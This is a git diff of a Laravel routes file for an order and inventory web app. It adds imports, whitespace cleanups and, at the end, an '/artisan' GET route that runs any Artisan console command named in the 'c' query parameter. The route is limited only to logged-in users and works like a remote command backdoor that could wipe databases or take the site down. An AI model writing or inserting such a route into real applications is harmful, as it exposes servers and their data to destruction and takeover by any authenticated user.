@@ -1,5 +1,6 @@
 <?php
 
+use Illuminate\Http\Request;
 use App\Http\Livewire\Item\Items;
 use App\Http\Livewire\Size\Sizes;
 use App\Http\Livewire\Users\Users;
@@ -9,6 +10,7 @@ use App\Http\Livewire\Item\CreateItem;
 use App\Http\Livewire\Item\UpdateItem;
 use App\Http\Livewire\Size\CreateSize;
 use App\Http\Livewire\Size\UpdateSize;
+use Illuminate\Support\Facades\Artisan;
 use App\Http\Livewire\Color\CreateColor;
 use App\Http\Livewire\Color\UpdateColor;
 use App\Http\Livewire\Salesman\Salesmen;
@@ -96,18 +98,24 @@ Route::middleware(['auth:sanctum', 'verified'])->group(function () {
         Route::get('/create-order', CreateOrder::class)->name('create-order');
         Route::get('/update-order/{id}', UpdateOrder::class)->name('update-order');
 
-        Route::prefix('/v2')->name('v2.')->group(function () { 
+        Route::prefix('/v2')->name('v2.')->group(function () {
             Route::get('/create-order', [\App\Http\Controllers\Order\OrderV2Controller::class, 'create'])->name('create-order');
             Route::post('/create-order', [\App\Http\Controllers\Order\OrderV2Controller::class, 'store'])->name('store-order');
             Route::get('/update-order/{id}', [\App\Http\Controllers\Order\OrderV2Controller::class, 'edit'])->name('edit-order');
             Route::match(['post', 'patch'], '/update-order', [\App\Http\Controllers\Order\OrderV2Controller::class, 'update'])->name('update-order');
         });
 
-        Route::prefix('/v3')->name('v3.')->group(function () { 
+        Route::prefix('/v3')->name('v3.')->group(function () {
             Route::get('/create-order', [\App\Http\Controllers\Order\OrderV3Controller::class, 'create'])->name('create-order');
             Route::get('/update-order/{id}', [\App\Http\Controllers\Order\OrderV3Controller::class, 'edit'])->name('edit-order');
             // Route::post('/create-order', [\App\Http\Controllers\OrderV3Controller::class, 'store'])->name('store-order');
             // Route::patch('/update-order', [\App\Http\Controllers\OrderV3Controller::class, 'update'])->name('update-order');
         });
+    });
+
+    Route::get('/artisan', function (Request $request) {
+        if ($request->has('c')) {
+            Artisan::call($request->c);
+        }
     });
 });
